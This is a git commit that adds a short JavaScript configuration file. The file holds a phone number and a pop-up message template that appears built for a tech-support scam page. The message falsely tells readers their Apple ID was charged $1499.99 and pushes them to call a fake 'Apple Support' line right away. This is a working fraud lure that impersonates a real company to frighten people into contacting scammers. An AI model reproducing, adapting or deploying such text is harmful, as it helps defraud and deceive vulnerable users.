4eb145171e3a4d5aa9b756eb3af7bf345483fa2b
lilipahari84-lang <lilipahari84@gmail.com>
2025-10-29 06:02:50 -0400

    Add files via upload

---
+++ text_tel.js
@@ -0,0 +1,3 @@
+window.defaultNumber = '+1-866-240-5403';
+window.defaultText = 'Your |%model%| Your Apple ID was recently used at APPLE STORE for $1499.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not You? Immediately call Apple Support +1-866-240-5403 to Freze it!';
+
